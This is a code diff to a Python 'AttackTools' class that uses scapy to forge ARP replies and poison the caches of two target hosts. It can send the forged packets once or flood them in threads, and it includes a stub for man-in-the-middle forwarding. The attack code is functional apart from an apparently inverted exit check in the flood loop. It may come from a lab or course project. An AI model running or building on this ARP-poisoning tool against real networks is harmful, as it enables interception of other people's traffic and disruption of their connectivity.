@@ -1,10 +1,12 @@
 import scapy.layers.l2
 from scapy.all import *
-from DataStructures import Host
-from threading import Thread
+from DataStructures import Host, StoppableThread
 
 
 class AttackTools:
+    thread1 = StoppableThread
+    thread2 = StoppableThread
+
     @staticmethod
     def build_arp_response(attacker: Host, target1: Host, target2: Host):
         # TODO: Add error detection
@@ -20,8 +22,8 @@ class AttackTools:
 
         return arp
 
-    @staticmethod
-    def poison(attacker: Host, target1: Host, target2: Host, bidirectional: bool, forwarding: bool, flood: bool):
+    @classmethod
+    def poison(cls, attacker: Host, target1: Host, target2: Host, bidirectional: bool, forwarding: bool, flood: bool):
         # TODO: Add error detection
         arp1 = AttackTools.build_arp_response(attacker, target1, target2)
         if not flood:
@@ -33,22 +35,30 @@ class AttackTools:
                 sendp(arp2)
 
         if flood:
-            thread1 = Thread(target=AttackTools.sendp_flood, args=(arp1,))
-            thread1.start()
+            threads = []
+            print("Sending flood of ARP packets to selected targets...")
+            cls.thread1 = StoppableThread(target=AttackTools.sendp_flood, args=(arp1,))
+            threads.append(cls.thread1)
+            cls.thread1.start()
 
         if flood and bidirectional:
-            thread2 = Thread(target=AttackTools.sendp_flood, args=(arp2,))
-            thread2.start()
+            cls.thread2 = StoppableThread(target=AttackTools.sendp_flood, args=(arp2,))
+            threads.append(cls.thread2)
+            cls.thread2.start()
 
         if forwarding:
             # TODO: Implement packet forwarding
             pass
 
-    @staticmethod
-    def sendp_flood(pkt):
+        return threads
+
+    @classmethod
+    def sendp_flood(cls, pkt):
         # TODO: Add exit condition
         while True:
-            sendp(pkt)
+            sendp(pkt, verbose=False)
+            if not cls.thread1.killed():
+                break
 
     def packet_forwarder(self, attacker: Host, target1: Host, target2: Host, bidirectional: bool):
         pass
